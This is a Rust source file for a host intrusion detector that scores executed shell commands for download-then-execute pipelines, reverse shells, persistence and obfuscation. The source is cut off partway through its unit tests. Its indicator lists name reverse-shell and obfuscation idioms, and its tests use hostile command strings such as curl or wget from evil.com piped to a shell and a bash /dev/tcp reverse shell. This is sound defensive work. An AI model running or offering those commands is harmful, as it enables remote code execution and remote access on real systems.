/// Execution Guard Detector — structural command analysis + behavioral risk scoring.
///
/// Monitors command execution events and detects suspicious patterns using:
/// - Structural AST analysis via tree-sitter-bash (for pipeline/script patterns)
/// - Argv-based analysis (fast path for individual exec events)
/// - Per-user command timeline correlation (sequence: download → chmod → execute)
///
/// # Event sources
/// - `shell.command_exec` — from exec_audit collector (auditd EXECVE records)
/// - `sudo.command` — from journald collector
///
/// # Incident type
/// `suspicious_execution`
///
/// # Modes
/// Only `observe` mode is implemented in this version. Future extension points:
///
/// - **`contain` mode** (future): on Critical incidents, invoke `suspend-user-sudo`
///   and attempt to isolate the user session.
/// - **`strict` mode** (future): pre-execution command interception via eBPF or
///   LSM hooks — deny execution *before* it runs.
use std::collections::{HashMap, VecDeque};
use std::path::Path;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};
use tracing::warn;

// ---------------------------------------------------------------------------
// Risk score constants
// ---------------------------------------------------------------------------

/// Download + immediate execute in a single shell pipeline (e.g. `curl ... | sh`)
const SCORE_DOWNLOAD_EXECUTE: u32 = 40;
/// General network pipe (downloader piped to any other command)
const SCORE_NETWORK_PIPE: u32 = 35;
/// Execution from a world-writable temp directory (/tmp, /dev/shm, etc.)
const SCORE_TMP_EXECUTION: u32 = 30;
/// Command executed via sudo (escalation context)
const SCORE_SUDO_ESCALATION: u32 = 25;
/// Reverse shell indicator (/dev/tcp, nc -e, bash -i >& ...)
const SCORE_REVERSE_SHELL: u32 = 50;
/// Script persistence attempt (crontab, .bashrc, systemctl enable)
const SCORE_PERSISTENCE: u32 = 20;
/// Obfuscated command (base64 decode | sh, eval, etc.)
const SCORE_OBFUSCATED: u32 = 30;
/// Sequence bonus: download → chmod +x → execute within the correlation window
const SCORE_SEQUENCE_BONUS: u32 = 25;

// ---------------------------------------------------------------------------
// Score thresholds → Severity mapping
// ---------------------------------------------------------------------------

/// Below this: no incident emitted
const THRESHOLD_NONE: u32 = 30;
/// 30–59: Low severity warning
const THRESHOLD_LOW: u32 = 60;
/// 60–79: High severity incident
const THRESHOLD_HIGH: u32 = 80;
// >= 80: Critical severity incident

// ---------------------------------------------------------------------------
// Known command categories
// ---------------------------------------------------------------------------

const DOWNLOADERS: &[&str] = &["curl", "wget", "fetch", "aria2c", "axel", "lwp-download"];
const SHELL_EXECUTORS: &[&str] = &["sh", "bash", "dash", "zsh", "fish", "ksh", "tcsh", "ash"];
const SCRIPT_INTERPRETERS: &[&str] = &[
    "python", "python3", "python2", "perl", "ruby", "node", "nodejs", "php",
];

const TMP_PREFIXES: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];

const REVERSE_SHELL_INDICATORS: &[&str] = &[
    "/dev/tcp/",
    "/dev/udp/",
    "nc -e",
    "ncat -e",
    "netcat -e",
    "bash -i",
    "socat exec:",
    "socat tcp",
    "socat udp",
    "0>&1",
    ">&/dev/tcp",
    // Python reverse shells
    "socket.socket",
    "subprocess.call",
    "pty.spawn",
    // Perl reverse shells
    "perl -e 'use socket",
    "perl -mio -e",
    // PHP reverse shells
    "php -r '$sock=fsockopen",
    // Ruby reverse shells
    "ruby -rsocket -e",
    // Telnet reverse shell
    "mkfifo /tmp/",
];

const PERSISTENCE_INDICATORS: &[&str] = &[
    "crontab",
    "/etc/cron",
    ".bashrc",
    ".bash_profile",
    ".profile",
    "/etc/profile",
    "/etc/rc.local",
    "systemctl enable",
    "update-rc.d",
    "chkconfig",
    ".config/autostart",
];

const OBFUSCATION_INDICATORS: &[&str] = &[
    // Base64 decode pipelines
    "base64 -d",
    "base64 --decode",
    // OpenSSL / hex decode
    "openssl enc -d",
    "| xxd -r",
    // Eval wrappers
    "eval $(echo",
    "eval \"$(echo",
    "eval `echo",
    "eval $(base64",
    "eval $(printf",
    // Reversed string tricks
    "| rev |",
    "| rev|",
    // printf-based decode
    "printf '%s'",
    "printf \"%s\"",
    "printf '\\x",
    "printf \"\\x",
    // echo hex decode
    "echo -e '\\x",
    "echo -e \"\\x",
    "echo -ne '\\x",
    "echo -ne \"\\x",
    // Python/Perl/Ruby inline exec
    "python -c \"import os",
    "python3 -c \"import os",
    "python -c 'import os",
    "python3 -c 'import os",
    "python -c \"import subprocess",
    "python3 -c \"import subprocess",
    "perl -e 'system",
    "perl -e \"system",
    "perl -e 'exec",
    "ruby -e '`",
    "ruby -e 'system",
    // Bash hex escape syntax
    "$'\\x",
];

// ---------------------------------------------------------------------------
// Execution mode
// ---------------------------------------------------------------------------

/// Current execution mode for the detector.
#[derive(Debug, Clone, PartialEq, Default)]
pub enum ExecutionMode {
    /// Detect, emit incidents, send to AI pipeline, log to audit. No blocking.
    #[default]
    Observe,
    // FUTURE: Contain — suspend-user-sudo + isolate-user-session on Critical incidents
    // FUTURE: Strict — pre-execution interception via eBPF / LSM (deny before run)
}

impl ExecutionMode {
    pub fn from_str(_s: &str) -> Self {
        // Only "observe" is implemented in v0.1; "contain" and "strict" are reserved.
        ExecutionMode::Observe
    }
}

// ---------------------------------------------------------------------------
// Risk signals
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
pub enum SignalKind {
    NetworkPipe,
    DownloadAndExecute,
    TmpExecution,
    SudoEscalation,
    ReverseShell,
    Persistence,
    Obfuscated,
    SequenceBonus,
}

impl SignalKind {
    fn score(&self) -> u32 {
        match self {
            SignalKind::NetworkPipe => SCORE_NETWORK_PIPE,
            SignalKind::DownloadAndExecute => SCORE_DOWNLOAD_EXECUTE,
            SignalKind::TmpExecution => SCORE_TMP_EXECUTION,
            SignalKind::SudoEscalation => SCORE_SUDO_ESCALATION,
            SignalKind::ReverseShell => SCORE_REVERSE_SHELL,
            SignalKind::Persistence => SCORE_PERSISTENCE,
            SignalKind::Obfuscated => SCORE_OBFUSCATED,
            SignalKind::SequenceBonus => SCORE_SEQUENCE_BONUS,
        }
    }

    fn label(&self) -> &'static str {
        match self {
            SignalKind::NetworkPipe => "network_pipe",
            SignalKind::DownloadAndExecute => "download_and_execute",
            SignalKind::TmpExecution => "tmp_execution",
            SignalKind::SudoEscalation => "sudo_escalation",
            SignalKind::ReverseShell => "reverse_shell",
            SignalKind::Persistence => "persistence_attempt",
            SignalKind::Obfuscated => "obfuscated_command",
            SignalKind::SequenceBonus => "download_chmod_execute_sequence",
        }
    }
}

#[derive(Debug, Clone)]
struct RiskSignal {
    kind: SignalKind,
    detail: String,
}

impl RiskSignal {
    fn score(&self) -> u32 {
        self.kind.score()
    }
}

// ---------------------------------------------------------------------------
// Command timeline: per-user rolling window for sequence detection
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
enum TimelineKind {
    Download,
    Chmod,
    Execute,
}

#[derive(Debug, Clone)]
struct TimelineEntry {
    ts: DateTime<Utc>,
    kind: TimelineKind,
    /// Best-guess target file (download output, chmod argument, or argv[0])
    target: Option<String>,
}

struct CommandTimeline {
    window: Duration,
    entries: VecDeque<TimelineEntry>,
}

impl CommandTimeline {
    fn new(window: Duration) -> Self {
        Self {
            window,
            entries: VecDeque::with_capacity(16),
        }
    }

    fn push(&mut self, entry: TimelineEntry) {
        let cutoff = entry.ts - self.window;
        while self.entries.front().is_some_and(|e| e.ts < cutoff) {
            self.entries.pop_front();
        }
        self.entries.push_back(entry);
    }

    /// Returns Some(detail string) if a download → chmod → execute sequence exists in the window.
    fn check_sequence(&self) -> Option<String> {
        let has_download = self
            .entries
            .iter()
            .any(|e| e.kind == TimelineKind::Download);
        let has_chmod = self.entries.iter().any(|e| e.kind == TimelineKind::Chmod);
        let has_execute = self.entries.iter().any(|e| e.kind == TimelineKind::Execute);

        if has_download && has_chmod && has_execute {
            let targets: Vec<String> = self
                .entries
                .iter()
                .filter_map(|e| e.target.clone())
                .collect();
            Some(format!(
                "download→chmod→execute sequence within {}s (targets: {})",
                self.window.num_seconds(),
                if targets.is_empty() {
                    "unknown".to_string()
                } else {
                    targets.join(", ")
                }
            ))
        } else {
            None
        }
    }
}

// ---------------------------------------------------------------------------
// AST analysis using tree-sitter-bash
// ---------------------------------------------------------------------------

/// Analyze shell command text structurally using the tree-sitter-bash grammar.
///
/// This handles inline pipeline detection that argv analysis alone cannot catch,
/// e.g. `bash -c "curl http://evil.com | sh"` or script file content.
fn analyze_ast(parser: &mut tree_sitter::Parser, text: &str) -> Vec<RiskSignal> {
    let source = text.as_bytes();
    let tree = match parser.parse(source, None) {
        Some(t) => t,
        None => {
            warn!(
                "tree-sitter-bash failed to parse command text (len={})",
                text.len()
            );
            return vec![];
        }
    };

    let mut signals = Vec::new();
    collect_ast_signals(tree.root_node(), source, &mut signals, 0);
    signals
}

fn collect_ast_signals(
    node: tree_sitter::Node,
    source: &[u8],
    signals: &mut Vec<RiskSignal>,
    depth: u8,
) {
    // Depth limit: prevents stack overflow on deeply nested scripts
    if depth > 32 {
        return;
    }

    match node.kind() {
        "pipeline" => check_pipeline(node, source, signals),
        "command" => check_command_node(node, source, signals),
        _ => {}
    }

    let mut cursor = node.walk();
    if cursor.goto_first_child() {
        loop {
            collect_ast_signals(cursor.node(), source, signals, depth + 1);
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }
}

fn node_text(node: tree_sitter::Node, source: &[u8]) -> String {
    String::from_utf8_lossy(&source[node.byte_range()]).to_string()
}

/// Extract the command name (basename) from a command AST node.
fn extract_command_name(node: tree_sitter::Node, source: &[u8]) -> Option<String> {
    // tree-sitter-bash: command has a named 'name' field
    if let Some(name_node) = node.child_by_field_name("name") {
        return Some(basename(&node_text(name_node, source)));
    }
    // Fallback: first named child
    for i in 0..node.child_count() {
        if let Some(child) = node.child(i as u32) {
            if child.is_named() {
                return Some(basename(&node_text(child, source)));
            }
        }
    }
    None
}

/// Check a pipeline node for downloader + executor patterns.
///
/// Example AST for `curl https://evil.com | sh`:
/// ```text
/// (pipeline
///   (command name: (command_name) @curl ...)
///   (command name: (command_name) @sh))
/// ```
fn check_pipeline(node: tree_sitter::Node, source: &[u8], signals: &mut Vec<RiskSignal>) {
    let mut command_names: Vec<String> = Vec::new();

    let mut cursor = node.walk();
    if cursor.goto_first_child() {
        loop {
            let child = cursor.node();
            if child.kind() == "command" {
                if let Some(name) = extract_command_name(child, source) {
                    command_names.push(name.to_ascii_lowercase());
                }
            }
            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    if command_names.is_empty() {
        return;
    }

    let has_downloader = command_names
        .iter()
        .any(|c| DOWNLOADERS.contains(&c.as_str()));
    let has_executor = command_names.iter().any(|c| {
        SHELL_EXECUTORS.contains(&c.as_str()) || SCRIPT_INTERPRETERS.contains(&c.as_str())
    });

    if has_downloader && has_executor {
        // Highest-risk pattern: download and immediately execute
        signals.push(RiskSignal {
            kind: SignalKind::DownloadAndExecute,
            detail: format!("dangerous pipeline: {}", command_names.join(" | ")),
        });
    } else if has_downloader {
        signals.push(RiskSignal {
            kind: SignalKind::NetworkPipe,
            detail: format!("pipeline with downloader: {}", command_names.join(" | ")),
        });
    }
}

/// Check an individual command node for reverse shell, persistence, and obfuscation patterns.
fn check_command_node(node: tree_sitter::Node, source: &[u8], signals: &mut Vec<RiskSignal>) {
    let full_text = node_text(node, source).to_ascii_lowercase();

    for indicator in REVERSE_SHELL_INDICATORS {
        if full_text.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::ReverseShell,
                detail: format!("reverse shell indicator: `{indicator}`"),
            });
            return; // one reverse shell signal is enough
        }
    }

    for indicator in OBFUSCATION_INDICATORS {
        if full_text.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::Obfuscated,
                detail: format!("obfuscation indicator: `{indicator}`"),
            });
            break;
        }
    }

    for indicator in PERSISTENCE_INDICATORS {
        if full_text.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::Persistence,
                detail: format!("persistence indicator: `{indicator}`"),
            });
            break;
        }
    }
}

// ---------------------------------------------------------------------------
// Argv-based analysis (fast path — no parser overhead)
// ---------------------------------------------------------------------------

/// Analyze a command based on its argv vector.
///
/// Detects: tmp execution, reverse shell in args, obfuscation, persistence.
/// Does NOT detect pipelines (use `analyze_ast` for that).
fn analyze_argv(argv: &[String]) -> Vec<RiskSignal> {
    if argv.is_empty() {
        return vec![];
    }

    let mut signals = Vec::new();
    let argv0 = &argv[0];

    // Execution from world-writable temp directories
    for prefix in TMP_PREFIXES {
        if argv0.starts_with(prefix) {
            signals.push(RiskSignal {
                kind: SignalKind::TmpExecution,
                detail: format!("executed from world-writable directory: {argv0}"),
            });
            break;
        }
    }

    // Scan all args for known dangerous patterns
    let all_args = argv.join(" ").to_ascii_lowercase();

    for indicator in REVERSE_SHELL_INDICATORS {
        if all_args.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::ReverseShell,
                detail: format!("reverse shell indicator in args: `{indicator}`"),
            });
            break;
        }
    }

    for indicator in OBFUSCATION_INDICATORS {
        if all_args.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::Obfuscated,
                detail: format!("obfuscation in args: `{indicator}`"),
            });
            break;
        }
    }

    for indicator in PERSISTENCE_INDICATORS {
        if all_args.contains(indicator) {
            signals.push(RiskSignal {
                kind: SignalKind::Persistence,
                detail: format!("persistence indicator: `{indicator}`"),
            });
            break;
        }
    }

    signals
}

/// Try to read a local script file and analyze its content with the AST parser.
///
/// Silently fails (fail-open) if the file cannot be read or parsed.
/// Limits analysis to the first 8 KB to avoid excessive I/O.
fn inspect_script_file(
    parser: &mut tree_sitter::Parser,
    path: &str,
    signals: &mut Vec<RiskSignal>,
) {
    const MAX_BYTES: usize = 8 * 1024;

    let content = match std::fs::read(path) {
        Ok(c) => c,
        Err(_) => return, // file not accessible — fail-open
    };
    let slice = if content.len() > MAX_BYTES {
        &content[..MAX_BYTES]
    } else {
        &content
    };
    let text = match std::str::from_utf8(slice) {
        Ok(t) => t,
        Err(_) => return,
    };

    let script_signals = analyze_ast(parser, text);
    for mut sig in script_signals {
        sig.detail = format!("script:{path}: {}", sig.detail);
        signals.push(sig);
    }
}

// ---------------------------------------------------------------------------
// Timeline helpers
// ---------------------------------------------------------------------------

fn detect_timeline_kind(argv0_base: &str, argv: &[String]) -> Option<TimelineKind> {
    if DOWNLOADERS.contains(&argv0_base) {
        return Some(TimelineKind::Download);
    }
    if argv0_base == "chmod" {
        // chmod +x or chmod a+x or chmod 755/777 style
        let has_exec = argv
            .iter()
            .skip(1)
            .any(|a| a.contains('x') || a == "777" || a == "755" || a == "775" || a == "744");
        if has_exec {
            return Some(TimelineKind::Chmod);
        }
    }
    if let Some(first) = argv.first() {
        // Relative path execution (./payload, ../something) — suggests running something
        // that was recently downloaded or made executable
        if first.starts_with("./") || first.starts_with("../") {
            return Some(TimelineKind::Execute);
        }
        // Absolute execution from world-writable temp directories — also tracked so
        // that a download→chmod→execute sequence using /tmp/payload absolute path
        // is correctly detected by the timeline correlator.
        for prefix in TMP_PREFIXES {
            if first.starts_with(prefix) {
                return Some(TimelineKind::Execute);
            }
        }
    }
    None
}

fn extract_target_file(argv0_base: &str, argv: &[String]) -> Option<String> {
    if DOWNLOADERS.contains(&argv0_base) {
        // curl -o filename / wget -O filename
        let mut i = 1;
        while i < argv.len() {
            if (argv[i] == "-O" || argv[i] == "-o") && i + 1 < argv.len() {
                return Some(argv[i + 1].clone());
            }
            if let Some(f) = argv[i].strip_prefix("--output=") {
                return Some(f.to_string());
            }
            i += 1;
        }
        return None;
    }
    if argv0_base == "chmod" {
        // Last non-flag, non-mode argument
        return argv
            .iter()
            .rev()
            .find(|a| {
                !a.starts_with('-')
                    && !a.chars().all(|c| {
                        matches!(
                            c,
                            '0'..='7'
                                | 'u'
                                | 'g'
                                | 'o'
                                | 'a'
                                | '+'
                                | '-'
                                | '='
                                | 'x'
                                | 'r'
                                | 'w'
                                | 's'
                                | 't'
                        )
                    })
            })
            .cloned();
    }
    None
}

// ---------------------------------------------------------------------------
// Scoring helpers
// ---------------------------------------------------------------------------

fn total_score(signals: &[RiskSignal]) -> u32 {
    signals.iter().map(|s| s.score()).sum()
}

fn score_to_severity(score: u32) -> Option<Severity> {
    if score < THRESHOLD_NONE {
        None
    } else if score < THRESHOLD_LOW {
        Some(Severity::Low)
    } else if score < THRESHOLD_HIGH {
        Some(Severity::High)
    } else {
        Some(Severity::Critical)
    }
}

fn basename(path: &str) -> String {
    Path::new(path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(path)
        .to_string()
}

fn truncate_cmd(s: &str, max: usize) -> &str {
    if s.len() <= max {
        s
    } else {
        &s[..max]
    }
}

// ---------------------------------------------------------------------------
// Incident builder (free function — avoids &mut self double-borrow)
// ---------------------------------------------------------------------------

struct IncidentCtx<'a> {
    host: &'a str,
    alerted: &'a mut HashMap<String, DateTime<Utc>>,
    window: Duration,
    ts: DateTime<Utc>,
    user: &'a str,
    command: &'a str,
    process: &'a str,
}

fn build_incident(ctx: IncidentCtx<'_>, signals: &[RiskSignal]) -> Option<Incident> {
    let IncidentCtx {
        host,
        alerted,
        window,
        ts,
        user,
        command,
        process,
    } = ctx;
    let score = total_score(signals);
    let severity = score_to_severity(score)?;

    // Dedup: suppress re-alerting for the same user + signal combination within the window
    let signal_key: String = signals
        .iter()
        .map(|s| s.kind.label())
        .collect::<Vec<_>>()
        .join(",");
    let dedup_key = format!("{user}:{signal_key}");

    if let Some(&last) = alerted.get(&dedup_key) {
        if ts - last < window {
            return None;
        }
    }
    alerted.insert(dedup_key, ts);

    let signal_labels: Vec<&str> = signals.iter().map(|s| s.kind.label()).collect();
    let evidence_details: Vec<serde_json::Value> = signals
        .iter()
        .map(|s| {
            serde_json::json!({
                "signal": s.kind.label(),
                "score": s.score(),
                "detail": s.detail,
            })
        })
        .collect();

    let summary = format!(
        "Command '{}' matched {} risk signal(s): {}",
        truncate_cmd(command, 80),
        signals.len(),
        signal_labels.join(", ")
    );

    let mut entities = vec![EntityRef::user(user.to_string())];
    if process != "sudo" && !process.is_empty() {
        entities.push(EntityRef::path(process.to_string()));
    }

    Some(Incident {
        ts,
        host: host.to_string(),
        incident_id: format!(
            "suspicious_execution:{}:{}",
            user,
            ts.format("%Y-%m-%dT%H:%MZ")
        ),
        severity,
        title: format!("Suspicious execution detected for user {user} (risk score: {score})"),
        summary,
        evidence: serde_json::json!([{
            "kind": "suspicious_execution",
            "user": user,
            "command": command,
            "process": process,
            "risk_score": score,
            "signals": signal_labels,
            "details": evidence_details,
        }]),
        recommended_checks: vec![
            format!("Review full command history for user {user}"),
            "Verify the command was authorized by change management".to_string(),
            "Check for persistence artifacts (crontabs, rc files, new services)".to_string(),
            "Review network connections opened after this command".to_string(),
        ],
        tags: vec![
            "execution".to_string(),
            "suspicious".to_string(),
            "command".to_string(),
        ],
        entities,
    })
}

// ---------------------------------------------------------------------------
// Main detector
// ---------------------------------------------------------------------------

pub struct ExecutionGuardDetector {
    host: String,
    #[allow(dead_code)] // reserved for future contain / strict modes
    mode: ExecutionMode,
    window: Duration,
    /// Per-user command timeline (rolling window for sequence detection)
    timelines: HashMap<String, CommandTimeline>,
    /// Dedup: last alert timestamp per dedup key
    alerted: HashMap<String, DateTime<Utc>>,
    /// Reusable tree-sitter parser (not thread-safe, lives in the main sensor loop)
    parser: tree_sitter::Parser,
}

impl ExecutionGuardDetector {
    pub fn new(host: impl Into<String>, window_seconds: u64, mode: ExecutionMode) -> Self {
        let mut parser = tree_sitter::Parser::new();
        let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
        parser
            .set_language(&language)
            .expect("failed to load tree-sitter-bash grammar");

        Self {
            host: host.into(),
            mode,
            window: Duration::seconds(window_seconds as i64),
            timelines: HashMap::new(),
            alerted: HashMap::new(),
            parser,
        }
    }

    /// Process an incoming event.
    ///
    /// Returns `Some(Incident)` when suspicious execution is confirmed.
    /// Returns `None` for events that do not match, are below threshold, or are
    /// suppressed by the dedup window.
    ///
    /// In `observe` mode, detection and alerting occur but no blocking action is taken.
    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        match event.kind.as_str() {
            "shell.command_exec" => self.process_exec_event(event),
            "sudo.command" => self.process_sudo_event(event),
            _ => None,
        }
    }

    fn process_exec_event(&mut self, event: &Event) -> Option<Incident> {
        let argv: Vec<String> = event.details["argv"]
            .as_array()
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();

        if argv.is_empty() {
            return None;
        }

        let user = event
            .details
            .get("user")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown")
            .to_string();

        let argv0 = argv[0].clone();
        let argv0_lower = argv0.to_ascii_lowercase();
        let argv0_base = basename(&argv0_lower);

        // Phase 1: argv-based signals (no self borrow except the call itself)
        let mut signals = analyze_argv(&argv);

        // Phase 2: AST analysis — only when a shell is executing inline or script content
        {
            if SHELL_EXECUTORS.contains(&argv0_base.as_str()) {
                // Shell with `-c "script"` — analyze the inline script structurally
                let inline: Option<String> = argv.windows(2).find_map(|w| {
                    if w[0] == "-c" {
                        Some(w[1].clone())
                    } else {
                        None
                    }
                });
                if let Some(text) = inline {
                    let ast_signals = analyze_ast(&mut self.parser, &text);
                    signals.extend(ast_signals);
                }

                // Shell executing a script file — read and analyze
                let script_path = argv
                    .iter()
                    .skip(1)
                    .find(|a| {
                        !a.starts_with('-')
                            && (a.ends_with(".sh") || a.ends_with(".bash") || a.ends_with(".ksh"))
                    })
                    .cloned();
                if let Some(path) = script_path {
                    inspect_script_file(&mut self.parser, &path, &mut signals);
                }
            }
        }

        // Phase 3: timeline update + sequence detection
        {
            let timeline_kind = detect_timeline_kind(&argv0_base, &argv);
            if let Some(tk) = timeline_kind {
                let target = extract_target_file(&argv0_base, &argv);
                let entry = TimelineEntry {
                    ts: event.ts,
                    kind: tk,
                    target,
                };
                let tl = self
                    .timelines
                    .entry(user.clone())
                    .or_insert_with(|| CommandTimeline::new(self.window));
                tl.push(entry);

                if let Some(seq_detail) = tl.check_sequence() {
                    signals.push(RiskSignal {
                        kind: SignalKind::SequenceBonus,
                        detail: seq_detail,
                    });
                }
            }
        }

        // Phase 4: emit incident (borrows self.alerted, self.host, self.window)
        build_incident(
            IncidentCtx {
                host: &self.host,
                alerted: &mut self.alerted,
                window: self.window,
                ts: event.ts,
                user: &user,
                command: &argv.join(" "),
                process: &argv0,
            },
            &signals,
        )
    }

    fn process_sudo_event(&mut self, event: &Event) -> Option<Incident> {
        let user = event.details["user"].as_str()?.trim().to_string();
        if user.is_empty() {
            return None;
        }
        let command = event.details["command"].as_str()?.trim().to_string();
        if command.is_empty() {
            return None;
        }

        // Phase 1: sudo always implies escalation context
        let mut signals = vec![RiskSignal {
            kind: SignalKind::SudoEscalation,
            detail: "command executed via sudo".to_string(),
        }];

        // Phase 2: full AST analysis (pipes and redirects in the command text)
        {
            let ast_signals = analyze_ast(&mut self.parser, &command);
            signals.extend(ast_signals);
        }

        // Phase 3: argv-style analysis on the command tokens
        let argv: Vec<String> = command.split_whitespace().map(str::to_string).collect();
        if !argv.is_empty() {
            signals.extend(analyze_argv(&argv));
        }

        // Phase 4: timeline
        if !argv.is_empty() {
            let argv0_base = basename(&argv[0].to_ascii_lowercase());
            let timeline_kind = detect_timeline_kind(&argv0_base, &argv);
            if let Some(tk) = timeline_kind {
                let target = extract_target_file(&argv0_base, &argv);
                let entry = TimelineEntry {
                    ts: event.ts,
                    kind: tk,
                    target,
                };
                let tl = self
                    .timelines
                    .entry(user.clone())
                    .or_insert_with(|| CommandTimeline::new(self.window));
                tl.push(entry);

                if let Some(seq_detail) = tl.check_sequence() {
                    signals.push(RiskSignal {
                        kind: SignalKind::SequenceBonus,
                        detail: seq_detail,
                    });
                }
            }
        }

        // Phase 5: emit incident
        build_incident(
            IncidentCtx {
                host: &self.host,
                alerted: &mut self.alerted,
                window: self.window,
                ts: event.ts,
                user: &user,
                command: &command,
                process: "sudo",
            },
            &signals,
        )
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use innerwarden_core::event::Severity as Sev;

    fn exec_event(argv: &[&str], ts: DateTime<Utc>) -> Event {
        let argv_json: Vec<serde_json::Value> = argv
            .iter()
            .map(|s| serde_json::Value::String(s.to_string()))
            .collect();
        Event {
            ts,
            host: "test-host".to_string(),
            source: "auditd".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Sev::Info,
            summary: format!("exec: {}", argv.join(" ")),
            details: serde_json::json!({
                "argv": argv_json,
                "command": argv.join(" "),
                "argc": argv.len(),
            }),
            tags: vec!["audit".to_string()],
            entities: vec![],
        }
    }

    fn sudo_event(user: &str, command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test-host".to_string(),
            source: "journald".to_string(),
            kind: "sudo.command".to_string(),
            severity: Sev::Info,
            summary: format!("{user} ran sudo: {command}"),
            details: serde_json::json!({
                "user": user,
                "run_as": "root",
                "command": command,
            }),
            tags: vec!["auth".to_string(), "sudo".to_string()],
            entities: vec![EntityRef::user(user.to_string())],
        }
    }

    fn make_detector() -> ExecutionGuardDetector {
        ExecutionGuardDetector::new("test-host", 300, ExecutionMode::Observe)
    }

    // ------------------------------------------------------------------
    // AST pipeline detection
    // ------------------------------------------------------------------

    #[test]
    fn ast_detects_curl_pipe_sh() {
        let mut parser = tree_sitter::Parser::new();
        let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
        parser.set_language(&language).unwrap();

        let signals = analyze_ast(&mut parser, "curl https://evil.com/install.sh | sh");
        assert!(
            signals
                .iter()
                .any(|s| s.kind == SignalKind::DownloadAndExecute),
            "expected DownloadAndExecute signal, got: {signals:?}"
        );
    }

    #[test]
    fn ast_detects_wget_pipe_bash() {
        let mut parser = tree_sitter::Parser::new();
        let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
        parser.set_language(&language).unwrap();

        let signals = analyze_ast(&mut parser, "wget -qO- http://evil.com/run.sh | bash");
        assert!(
            signals
                .iter()
                .any(|s| s.kind == SignalKind::DownloadAndExecute),
            "expected DownloadAndExecute signal, got: {signals:?}"
        );
    }

    #[test]
    fn ast_clean_pipeline_not_flagged() {
        let mut parser = tree_sitter::Parser::new();
        let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
        parser.set_language(&language).unwrap();

        let signals = analyze_ast(&mut parser, "cat /etc/hosts | grep localhost");
        assert!(
            !signals
                .iter()
                .any(|s| s.kind == SignalKind::DownloadAndExecute),
            "clean pipeline should not be flagged"
        );
    }

    // ------------------------------------------------------------------
    // Argv-based detection
    // ------------------------------------------------------------------

    #[test]
    fn detects_tmp_execution() {
        let signals = analyze_argv(&["/tmp/malware".to_string(), "--flag".to_string()]);
        assert!(
            signals.iter().any(|s| s.kind == SignalKind::TmpExecution),
            "expected TmpExecution signal"
        );
    }

    #[test]
    fn detects_dev_shm_execution() {
        let signals = analyze_argv(&["/dev/shm/backdoor".to_string()]);
        assert!(signals.iter().any(|s| s.kind == SignalKind::TmpExecution));
    }

    #[test]
    fn detects_reverse_shell_in_args() {
        let signals = analyze_argv(&[
            "bash".to_string(),
            "-i".to_string(),
            ">&".to_string(),
            "/dev/tcp/1.2.3.4/4444".to_string(),
            "0>&1".to_string(),
        ]);
        assert!(signals.iter().any(|s| s.kind == SignalKind::ReverseShell));
    }

    #[test]
    fn normal_command_not_flagged() {
        let signals = analyze_argv(&[
            "/usr/bin/systemctl".to_string(),
            "status".to_string(),
            "nginx".to_string(),
        ]);
        assert!(
            signals.is_empty(),
            "normal command should produce no signals"
        );
    }

    // ------------------------------------------------------------------
    // Full detector: exec events
    // ------------------------------------------------------------------

    #[test]
    fn detector_ignores_unknown_events() {
        let mut det = make_detector();
        let ev = Event {
            ts: Utc::now(),
            host: "h".to_string(),
            source: "auth".to_string(),
            kind: "ssh.login_failed".to_string(),
            severity: Sev::Info,
            summary: "login failed".to_string(),
            details: serde_json::json!({}),
            tags: vec![],
            entities: vec![],
        };
        assert!(det.process(&ev).is_none());
    }

    #[test]
    fn detector_emits_incident_for_tmp_execution() {
        let mut det = make_detector();
        let ev = exec_event(&["/tmp/evil", "--arg"], Utc::now());
        let inc = det
            .process(&ev)
            .expect("expected incident for /tmp execution");
        assert_eq!(inc.severity, Severity::Low); // score = 30, exactly at THRESHOLD_NONE boundary
    }

    #[test]
    fn detector_emits_critical_for_reverse_shell() {
        let mut det = make_detector();
        // reverse shell from /tmp → score 50 + 30 = 80 → Critical
        let ev = exec_event(
            &["/tmp/shell", "-i", ">&", "/dev/tcp/1.2.3.4/4444", "0>&1"],
            Utc::now(),
        );
        let inc = det.process(&ev).expect("expected incident");
        assert!(
            matches!(inc.severity, Severity::High | Severity::Critical),
            "expected High or Critical, got: {:?}",
            inc.severity
        );
        assert!(inc.incident_id.starts_with("suspicious_execution:"));
    }

    #[test]
    fn detector_deduplicates_same_signal_within_window() {
        let mut det = make_detector();
        let base = Utc::now();
        let ev1 = exec_event(&["/tmp/evil"], base);
        let ev2 = exec_event(&["/tmp/evil"], base + Duration::seconds(5));

        let first = det.process(&ev1);
        let second = det.process(&ev2);

        assert!(first.is_some(), "first event should produce incident");
        assert!(
            second.is_none(),
            "duplicate within window should be suppressed"
        );
    }

    // ------------------------------------------------------------------
    // Sudo event handling
    // ------------------------------------------------------------------

    #[test]
    fn detector_emits_for_sudo_curl_pipe_sh() {
        let mut det = make_detector();
        let ev = sudo_event(
            "deploy",
            "curl -fsSL https://evil.com/install.sh | sh",
            Utc::now(),
        );
        let inc = det
            .process(&ev)
            .expect("expected incident for sudo curl | sh");
        // score = 25 (sudo) + 40 (download+execute) = 65 → High
        assert_eq!(inc.severity, Severity::High);
        let evidence = &inc.evidence[0];
